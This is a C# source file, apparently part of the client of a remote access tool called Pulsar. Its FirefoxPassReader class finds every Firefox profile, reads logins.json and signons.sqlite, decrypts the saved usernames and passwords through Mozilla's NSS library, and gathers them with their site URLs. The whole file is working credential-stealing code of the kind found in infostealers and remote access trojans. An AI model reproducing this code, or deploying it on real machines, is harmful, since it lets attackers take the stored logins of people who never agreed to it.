using Pulsar.Client.Helper;
using Pulsar.Client.Recovery.Utilities;
using Pulsar.Common.Models;
using SharpDX.Direct3D11;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.Serialization;

namespace Pulsar.Client.Recovery.Browsers
{
    public class FirefoxPassReader
    {
        public const int MaxAccountsPerProfile = 512;
        public const long MaxLoginsFileBytes = 16 * 1024 * 1024;

        public sealed class ReadOutcome
        {
            public List<RecoveredAccount> Accounts { get; set; } = new List<RecoveredAccount>();
            public PasswordRecoveryStatus Status { get; set; } = PasswordRecoveryStatus.Empty;
            public string Detail { get; set; }
            public bool Truncated { get; set; }
        }

        public static ReadOutcome ReadAccountsBounded(string profiles, string name)
        {
            var outcome = new ReadOutcome();
            if (string.IsNullOrEmpty(profiles) || !Directory.Exists(profiles))
            {
                outcome.Status = PasswordRecoveryStatus.Unsupported;
                outcome.Detail = "Firefox profiles directory was not found.";
                return outcome;
            }

            try
            {
                string[] dirs = Directory.GetDirectories(profiles);
                if (dirs.Length == 0)
                {
                    outcome.Status = PasswordRecoveryStatus.Empty;
                    outcome.Detail = "No Firefox profile directories were found.";
                    return outcome;
                }

                bool foundLoginSource = false;
                foreach (string dir in dirs)
                {
                    if (File.Exists(Path.Combine(dir, "logins.json")) ||
                        File.Exists(Path.Combine(dir, "signons.sqlite")))
                    {
                        foundLoginSource = true;
                        break;
                    }
                }

                if (!foundLoginSource)
                {
                    outcome.Status = PasswordRecoveryStatus.Empty;
                    outcome.Detail = "No Firefox login source was found.";
                    return outcome;
                }

                string mozillaPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Mozilla Firefox");
                if (!File.Exists(Path.Combine(mozillaPath, "nss3.dll")))
                {
                    outcome.Status = PasswordRecoveryStatus.Unsupported;
                    outcome.Detail = "Mozilla NSS libraries are unavailable.";
                    return outcome;
                }

                outcome.Accounts = ReadAccounts(profiles, name);
                if (outcome.Accounts.Count >= MaxAccountsPerProfile)
                    outcome.Truncated = true;

                if (outcome.Accounts.Count > 0)
                {
                    outcome.Status = PasswordRecoveryStatus.Supported;
                }
                else
                {
                    outcome.Status = PasswordRecoveryStatus.Empty;
                    outcome.Detail = "No decryptable Firefox credentials were found.";
                }
            }
            catch (Exception ex)
            {
                outcome.Status = PasswordRecoveryStatus.Failed;
                outcome.Detail = ex.GetType().Name;
            }

            return outcome;
        }

        /// <inheritdoc />
        public static List<RecoveredAccount> ReadAccounts(string profiles, string name)
        {
            string[] dirs = Directory.GetDirectories(profiles);

            var logins = new List<RecoveredAccount>();
            if (dirs.Length == 0)
                return logins;

            foreach (string dir in dirs)
            {
                string signonsFile = string.Empty;
                string loginsFile = string.Empty;
                bool signonsFound = false;
                bool loginsFound = false;

                string[] files = Directory.GetFiles(dir, "signons.sqlite");
                if (files.Length > 0)
                {
                    signonsFile = files[0];
                    signonsFound = true;
                }

                files = Directory.GetFiles(dir, "logins.json");
                if (files.Length > 0)
                {
                    loginsFile = files[0];
                    loginsFound = true;
                }

                if (loginsFound || signonsFound)
                {
                    using (var decrypter = new FFDecryptor())
                    {
                        var r = decrypter.Init(dir);
                        if (!decrypter.IsInitialized)
                            continue;
                        if (signonsFound)
                        {
                            SQLiteHandler sqlDatabase;

                            if (!File.Exists(signonsFile))
                                return logins;

                            try
                            {
                                sqlDatabase = new SQLiteHandler(signonsFile);
                            }
                            catch (Exception)
                            {
                                return logins;
                            }


                            if (!sqlDatabase.ReadTable("moz_logins"))
                                return logins;

                            for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                            {
                                if (logins.Count >= MaxAccountsPerProfile)
                                    break;
                                try
                                {
                                    var host = sqlDatabase.GetValue(i, "hostname");
                                    var user = decrypter.Decrypt(sqlDatabase.GetValue(i, "encryptedUsername"));
                                    var pass = decrypter.Decrypt(sqlDatabase.GetValue(i, "encryptedPassword"));

                                    if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(user))
                                    {
                                        logins.Add(new RecoveredAccount
                                        {
                                            Url = host,
                                            Username = user,
                                            Password = pass,
                                            Application = name
                                        });
                                    }
                                }
                                catch (Exception)
                                {
                                    // ignore invalid entry
                                }
                            }
                        }

                        if (loginsFound)
                        {
                            var loginsInfo = new FileInfo(loginsFile);
                            if (loginsInfo.Length > MaxLoginsFileBytes)
                            {
                                break;
                            }

                            FFLogins ffLoginData;
                            using (var sr = File.OpenRead(loginsFile))
                            {
                                ffLoginData = JsonHelper.Deserialize<FFLogins>(sr);
                            }

                            foreach (Login loginData in ffLoginData.Logins)
                            {
                                if (logins.Count >= MaxAccountsPerProfile)
                                    break;
                                string username = decrypter.Decrypt(loginData.EncryptedUsername);
                                string password = decrypter.Decrypt(loginData.EncryptedPassword);
                                logins.Add(new RecoveredAccount
                                {
                                    Username = username,
                                    Password = password,
                                    Url = loginData.Hostname.ToString(),
                                    Application = name
                                });
                            }
                        }
                    }
                }

            }

            return logins;
        }

        [DataContract]
        private class FFLogins
        {
            [DataMember(Name = "nextId")]
            public long NextId { get; set; }

            [DataMember(Name = "logins")]
            public Login[] Logins { get; set; }

            [IgnoreDataMember]
            [DataMember(Name = "potentiallyVulnerablePasswords")]
            public object[] PotentiallyVulnerablePasswords { get; set; }

            [IgnoreDataMember]
            [DataMember(Name = "dismissedBreachAlertsByLoginGUID")]
            public DismissedBreachAlertsByLoginGuid DismissedBreachAlertsByLoginGuid { get; set; }

            [DataMember(Name = "version")]
            public long Version { get; set; }
        }

        [DataContract]
        private class DismissedBreachAlertsByLoginGuid
        {
        }

        [DataContract]
        private class Login
        {
            [DataMember(Name = "id")]
            public long Id { get; set; }

            [DataMember(Name = "hostname")]
            public Uri Hostname { get; set; }

            [DataMember(Name = "httpRealm")]
            public object HttpRealm { get; set; }

            [DataMember(Name = "formSubmitURL")]
            public Uri FormSubmitUrl { get; set; }

            [DataMember(Name = "usernameField")]
            public string UsernameField { get; set; }

            [DataMember(Name = "passwordField")]
            public string PasswordField { get; set; }

            [DataMember(Name = "encryptedUsername")]
            public string EncryptedUsername { get; set; }

            [DataMember(Name = "encryptedPassword")]
            public string EncryptedPassword { get; set; }

            [DataMember(Name = "guid")]
            public string Guid { get; set; }

            [DataMember(Name = "encType")]
            public long EncType { get; set; }

            [DataMember(Name = "timeCreated")]
            public long TimeCreated { get; set; }

            [DataMember(Name = "timeLastUsed")]
            public long TimeLastUsed { get; set; }

            [DataMember(Name = "timePasswordChanged")]
            public long TimePasswordChanged { get; set; }

            [DataMember(Name = "timesUsed")]
            public long TimesUsed { get; set; }
        }
    }
}
